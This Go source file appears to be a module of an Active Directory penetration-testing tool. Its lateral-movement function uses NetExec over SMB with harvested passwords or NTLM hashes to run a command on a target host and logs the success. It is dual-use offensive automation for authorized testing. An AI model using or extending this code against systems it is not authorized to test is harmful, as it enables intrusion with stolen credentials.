package modules

import (
	"context"
	"adpack/core"
	"adpack/tools"
	"adpack/utils"
	"fmt"
	"strings"
	"time"
)

func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println(utils.ErrorStyle.Render("[!] No target available for lateral movement."))
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println(utils.ErrorStyle.Render("[!] No valid credentials found for lateral movement."))
		result.Success = false
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP, Port: 445,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	fmt.Println(utils.InfoStyle.Render(fmt.Sprintf("[*] Testing lateral movement to %s via WMI/SMB...", host.IP)))
	ctx := context.Background()
	r, err := tools.NetExec.Run(ctx, target, "-x", []string{"whoami"})
	
	if err == nil && r.Success {
		output := r.Stdout
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: "lateral_success", Phase: core.PhaseLateral,
			Source: "netexec_smb", Key: host.IP, Value: output,
			Confidence: 1.0, Timestamp: time.Now(),
		})
		fmt.Println(utils.SuccessStyle.Render("[+] Lateral movement successful. Output:"))
		fmt.Println(utils.OutputBox.Render(strings.TrimSpace(output)))
	} else {
		fmt.Println(utils.ErrorStyle.Render(fmt.Sprintf("[!] Lateral movement failed: %s", r.Stderr)))
		result.Success = false
	}
	
	return result
}
